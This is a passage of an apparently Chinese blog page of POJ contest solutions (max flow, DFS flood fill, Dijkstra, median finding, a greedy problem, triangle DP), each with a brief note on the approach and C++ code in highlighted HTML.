class="meta">#<span class="meta-keyword">define</span> MAX 205</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7fffffff</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123;<span class="keyword">int</span> to ,cap, rev;&#125;;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_edge</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to,<span class="keyword">int</span> cap)</span></span>&#123;</div><div class="line">    edge one,two;</div><div class="line">    one.to = to;</div><div class="line">    one.cap = cap;</div><div class="line">    one.rev = (<span class="keyword">int</span>)(G[to].size());</div><div class="line">    G[from].push_back(one);</div><div class="line">    two.to = from;</div><div class="line">    two.cap = <span class="number">0</span>;</div><div class="line">    two.rev = (<span class="keyword">int</span>)(G[from].size()<span class="number">-1</span>);</div><div class="line">    G[to].push_back(two);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v, <span class="keyword">int</span> t, <span class="keyword">int</span> f)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> ( v == t)</div><div class="line">        <span class="keyword">return</span> f;</div><div class="line">    used[v] = <span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)G[v].size(); i++)&#123;</div><div class="line">        edge &amp;e = G[v][i];</div><div class="line">        <span class="keyword">if</span> ( !used[e.to] &amp;&amp; e.cap &gt; <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">int</span> d = dfs(e.to,t, f &gt; e.cap?e.cap:f);</div><div class="line">            <span class="keyword">if</span> ( d &gt; <span class="number">0</span>) &#123;</div><div class="line">                e.cap -= d;</div><div class="line">                G[e.to][e.rev].cap += d;</div><div class="line">                <span class="keyword">return</span> d;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_flow</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> flow = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;)&#123;</div><div class="line">        <span class="built_in">memset</span>(used, <span class="number">0</span>, <span class="keyword">sizeof</span>(used));</div><div class="line">        <span class="keyword">int</span> f = dfs(s,t,INF);</div><div class="line">        <span class="keyword">if</span> (f == <span class="number">0</span>) <span class="keyword">return</span> flow;</div><div class="line">        flow += f;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m) != EOF)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">            G[i].clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">int</span> s, t,c;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;s,&amp;t,&amp;c);</div><div class="line">            add_edge(s,t,c);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,max_flow(<span class="number">1</span>,m));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1979"><a href="#1979" class="headerlink" title="1979"></a>1979</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1979" target="_blank" rel="external">http://poj.org/problem?id=1979</a></p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>DFS()</p>
<h3 id="提交-3"><a href="#提交-3" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> X 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 20</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line"><span class="keyword">int</span> nx,ny;</div><div class="line"><span class="keyword">int</span> sx,sy;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="keyword">char</span> maze[X][Y];</div><div class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    num += <span class="number">1</span>;</div><div class="line">    maze[r][s] = <span class="string">'#'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</div><div class="line">        <span class="keyword">int</span> t1 = r+dx[i];</div><div class="line">        <span class="keyword">int</span> t2 = s+dy[i];</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; <span class="number">0</span> &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == <span class="string">'.'</span>)&#123;</div><div class="line">            dfs(t1,t2);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>( x != <span class="number">0</span> &amp;&amp; y != <span class="number">0</span>)&#123;</div><div class="line">        num  = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x; i++)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; y; j++)&#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;maze[i][j]);</div><div class="line">                <span class="keyword">if</span> (maze[i][j] == <span class="string">'@'</span>)&#123;</div><div class="line">                    sx = i;</div><div class="line">                    sy = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        dfs(sx,sy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2387"><a href="#2387" class="headerlink" title="2387"></a>2387</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2387" target="_blank" rel="external">http://poj.org/problem?id=2387</a></p>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>最短路径 +　队列优先　。<br>这题竟然是先读入边数再读入顶点数，Ｏrz<br>另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。</p>
<h3 id="提交-4"><a href="#提交-4" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_V 200000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123; <span class="keyword">int</span> to, cost, flag ;&#125;;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</div><div class="line"></div><div class="line"><span class="keyword">int</span> V;</div><div class="line"><span class="keyword">int</span> E;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX_V];</div><div class="line"><span class="keyword">int</span> d[MAX_V];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;E,&amp;V);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)&#123;</div><div class="line">        <span class="keyword">int</span> s, t, cost;</div><div class="line">        edge temp1,temp2;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;s, &amp;t, &amp;cost);</div><div class="line">        temp1.to = t;</div><div class="line">        temp1.cost = cost;</div><div class="line">        G[s].push_back(temp1);</div><div class="line"></div><div class="line"></div><div class="line">        temp2.to = s;</div><div class="line">        temp2.cost = cost;</div><div class="line">        G[t].push_back(temp2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[V]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; que;</div><div class="line"></div><div class="line">    fill(d+<span class="number">1</span>,d + V+<span class="number">1</span>, INF);</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line">    que.push(P(<span class="number">0</span>,s));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( !que.empty())&#123;</div><div class="line">        P p = que.top();</div><div class="line">        que.pop();</div><div class="line">        <span class="keyword">int</span> v = p.second;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d[v] &lt; p.first)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; G[v].size(); i++)&#123;</div><div class="line">            edge e = G[v][i];</div><div class="line">            <span class="keyword">if</span> ( d[e.to] &gt; d[v] + e.cost) &#123;</div><div class="line">                d[e.to] = d[v] + e.cost;</div><div class="line">                que.push(P(d[e.to], e.to));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2388"><a href="#2388" class="headerlink" title="2388"></a>2388</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2388" target="_blank" rel="external">http://poj.org/problem?id=2388</a></p>
<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>先排序，之后打印出中间值。水题。</p>
<h3 id="提交-5"><a href="#提交-5" class="headerlink" title="提交"></a>提交</h3><h4 id="stl"><a href="#stl" class="headerlink" title="stl"></a>stl</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    sort(arr,arr+n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> h)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(h&lt;l+<span class="number">2</span>)<span class="keyword">return</span> ;</div><div class="line">    <span class="keyword">int</span> e=h,p=l;</div><div class="line">    <span class="keyword">while</span>(l&lt;h)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]);</div><div class="line">        <span class="keyword">while</span>(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]);</div><div class="line">        <span class="keyword">if</span>(l&lt;h) swap(arr[l],arr[h]);</div><div class="line">    &#125;</div><div class="line">    swap(arr[h],arr[p]);</div><div class="line">    quick_sort(p,h);</div><div class="line">    quick_sort(l,e);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    quick_sort(<span class="number">0</span>,n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3069"><a href="#3069" class="headerlink" title="3069"></a>3069</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3069" target="_blank" rel="external">http://poj.org/problem?id=3069</a></p>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>贪心算法。在 <code>while( i &lt; n )</code> 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。</p>
<h3 id="提交-6"><a href="#提交-6" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> r;</div><div class="line"><span class="keyword">int</span> loc[N];</div><div class="line"><span class="keyword">int</span> marknum;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    <span class="keyword">while</span> ( n != <span class="number">-1</span> &amp;&amp; r != <span class="number">-1</span>)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;loc[i]);</div><div class="line">        sort(loc,loc+n);</div><div class="line">        marknum = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ( i &lt; n )&#123;</div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] )</div><div class="line">                i++;</div><div class="line">            i--;</div><div class="line">            marknum++;</div><div class="line">            j = i;</div><div class="line"></div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i])</div><div class="line">                i++;</div><div class="line"></div><div class="line">            j = i;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,marknum);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3176"><a href="#3176" class="headerlink" title="3176"></a>3176</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3176" target="_blank" rel="external">http://poj.org/problem?id=3176</a></p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>二维数组triangle用于保存三角形，二维数组way用于保存路径。<br>以题目数据为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">7</div><div class="line">3 8</div><div class="line">8 1 0</div><div class="line">2 7 4 4</div><div class="line">4 5 2 6 5</div></pre></td></tr></table></figure></p>
<p>分为三种情况：</p>
<ul>
<li>最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j]</li>
<li>最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j];</li>
<li>中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j];</li>
</ul>
<p>填表完成后，对最后一行way[n-1][]找出最大值即为答案。</p>
<h3 id="提交-7"><a href="#提交-7" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div 